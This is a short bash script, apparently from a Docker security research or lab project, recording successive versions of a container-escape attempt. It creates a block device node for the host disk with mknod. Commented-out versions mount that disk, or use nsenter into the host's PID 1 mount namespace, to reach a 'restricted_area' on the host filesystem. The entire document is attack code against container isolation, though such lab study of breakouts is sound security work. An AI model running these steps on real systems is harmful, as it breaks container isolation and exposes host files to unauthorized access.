#bin/bash

#Version 3
mknod --mode 0600 /dev/vda1 b 253 1
mkdir -p /tmpmount
#Mount is not allowed in container
#mount /dev/vda1 /tmpmount
#mount -o bind /tmpmount/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/restricted_area /doot
#ls /doot

#Version 5
#nsenter --mount=/media/host/proc/1/ns/mnt -- mount /dev/vda1 /home/mic

#Version 6-7
#nsenter --mount=/proc/1/ns/mnt -- mount /dev/vda1 /home/mic
